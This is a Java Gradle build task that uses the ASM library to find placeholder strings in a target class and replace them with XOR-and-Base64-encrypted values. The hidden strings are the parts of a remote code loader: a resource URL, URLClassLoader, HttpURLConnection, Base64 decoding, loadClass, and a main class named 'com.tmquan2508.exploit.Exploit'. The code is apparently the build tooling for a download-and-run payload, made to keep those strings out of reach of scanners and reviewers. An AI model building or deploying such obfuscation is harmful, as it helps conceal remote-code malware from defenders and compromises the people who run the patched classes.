package com.tmquan2508.buildtools;

import org.gradle.api.DefaultTask;
import org.gradle.api.file.DirectoryProperty;
import org.gradle.api.provider.Property;
import org.gradle.api.tasks.Input;
import org.gradle.api.tasks.InputDirectory;
import org.gradle.api.tasks.OutputDirectory;
import org.gradle.api.tasks.TaskAction;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.*;

public abstract class AsmObfuscateStringsTask extends DefaultTask {

    @InputDirectory
    public abstract DirectoryProperty getClassesDir();

    @OutputDirectory
    public abstract DirectoryProperty getOutputClassesDir();

    @Input
    public abstract Property<String> getTargetClass();

    private static final Map<String, String> OBFUSCATION_MAP = new LinkedHashMap<>();
    static {
        OBFUSCATION_MAP.put("::S_URL_PROVIDER::", "http://localhost:3000/resource");
        OBFUSCATION_MAP.put("::S_JAVA_NET_URL::", "java.net.URL");
        OBFUSCATION_MAP.put("::S_JAVA_NET_URL_CLASS_LOADER::", "java.net.URLClassLoader");
        OBFUSCATION_MAP.put("::S_JAVA_LANG_CLASS_LOADER::", "java.lang.ClassLoader");
        OBFUSCATION_MAP.put("::S_MAIN_CLASS::", "com.tmquan2508.exploit.Exploit");
        OBFUSCATION_MAP.put("::S_LOAD_CLASS_METHOD::", "loadClass");
        OBFUSCATION_MAP.put("::S_HTTP_CONN_CLASS::", "java.net.HttpURLConnection");
        OBFUSCATION_MAP.put("::S_OPEN_CONN_METHOD::", "openConnection");
        OBFUSCATION_MAP.put("::S_SET_REQ_METHOD::", "setRequestMethod");
        OBFUSCATION_MAP.put("::S_GET_INPUT_STREAM_METHOD::", "getInputStream");
        OBFUSCATION_MAP.put("::S_DISCONNECT_METHOD::", "disconnect");
        OBFUSCATION_MAP.put("::S_JAVA_UTIL_BASE64::", "java.util.Base64");
        OBFUSCATION_MAP.put("::S_GET_DECODER_METHOD::", "getDecoder");
        OBFUSCATION_MAP.put("::S_DECODE_METHOD::", "decode");
    }

    @TaskAction
    public void obfuscate() throws Exception {
        File classesDirFile = getClassesDir().get().getAsFile();
        File outputDirFile = getOutputClassesDir().get().getAsFile();
        String targetClassName = getTargetClass().get();

        if (!classesDirFile.exists()) {
            throw new RuntimeException("classes dir not found: " + classesDirFile);
        }
        if (!outputDirFile.exists()) {
            outputDirFile.mkdirs();
        }

        String key = generateRandomKey(32);
        getLogger().lifecycle("-> Generated new obfuscation key: " + key);

        Map<String, String> encryptedMap = new LinkedHashMap<>();
        for (Map.Entry<String,String> e : OBFUSCATION_MAP.entrySet()) {
            String encrypted = encrypt(e.getValue(), key);
            String decryptedCheck = decrypt(encrypted, key);
            getLogger().lifecycle("  [ENCRYPT] " + e.getKey() + " -> " + e.getValue() +
                                  " -> " + encrypted + " -> [DECRYPT CHECK] " + decryptedCheck);

            if (!e.getValue().equals(decryptedCheck)) {
                getLogger().warn("!!! Decrypt check mismatch for " + e.getKey());
            }
            encryptedMap.put(e.getKey(), encrypted);
        }
        encryptedMap.put("::KEY::", key);
        getLogger().lifecycle("-> Encrypted all target strings. Key: " + key);

        String targetPath = targetClassName.replace('.', '/') + ".class";
        
        Path inPath = classesDirFile.toPath().resolve(targetPath);
        if (!Files.exists(inPath)) {
            getLogger().error("  [ERROR] Target class not found: " + targetPath);
            return;
        }

        getLogger().lifecycle("  [PATCH] Processing: " + targetPath);
        byte[] classBytes = Files.readAllBytes(inPath);

        ClassReader cr = new ClassReader(classBytes);
        ClassNode cn = new ClassNode();
        cr.accept(cn, 0);

        boolean changed = false;
        
        if (cn.methods != null) {
            for (MethodNode mn : (List<MethodNode>) cn.methods) {
                if (mn.instructions == null) continue;
                for (AbstractInsnNode insn = mn.instructions.getFirst(); insn != null; insn = insn.getNext()) {
                    if (insn instanceof LdcInsnNode) {
                        Object cst = ((LdcInsnNode) insn).cst;
                        if (cst instanceof String) {
                            String s = (String) cst;
                            if (encryptedMap.containsKey(s)) {
                                String newVal = encryptedMap.get(s);
                                getLogger().lifecycle("  [LDC] in " + cn.name + "." + mn.name + mn.desc + " -> replacing constant: " + s + " -> " + newVal);
                                ((LdcInsnNode) insn).cst = newVal;
                                changed = true;
                            }
                        }
                    }
                }
            }
        }

        if (!changed) {
            getLogger().lifecycle("  [WARN] No placeholders replaced in " + targetPath);
        }

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
        cn.accept(cw);
        byte[] outBytes = cw.toByteArray();

        Path targetOut = outputDirFile.toPath().resolve(targetPath);
        Files.createDirectories(targetOut.getParent());
        try (FileOutputStream fos = new FileOutputStream(targetOut.toFile())) {
            fos.write(outBytes);
        }
        getLogger().lifecycle("  [OK] Wrote patched class to " + targetOut);
        getLogger().lifecycle("  [VERIFY] Written class size: " + outBytes.length + " bytes");
        
        getLogger().lifecycle("-> Task finished processing " + targetClassName);
    }

    private static String generateRandomKey(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom rnd = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(rnd.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private static String encrypt(String plainText, String key) {
        try {
            byte[] plainBytes = plainText.getBytes();
            byte[] result = new byte[plainBytes.length];
            for (int i = 0; i < plainBytes.length; i++) {
                result[i] = (byte) (plainBytes[i] ^ key.charAt(i % key.length()));
            }
            return Base64.getEncoder().encodeToString(result);
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    }

    private static String decrypt(String encryptedBase64, String key) {
        try {
            byte[] encryptedBytes = Base64.getDecoder().decode(encryptedBase64);
            byte[] result = new byte[encryptedBytes.length];
            for (int i = 0; i < encryptedBytes.length; i++) {
                result[i] = (byte) (encryptedBytes[i] ^ key.charAt(i % key.length()));
            }
            return new String(result);
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    }
}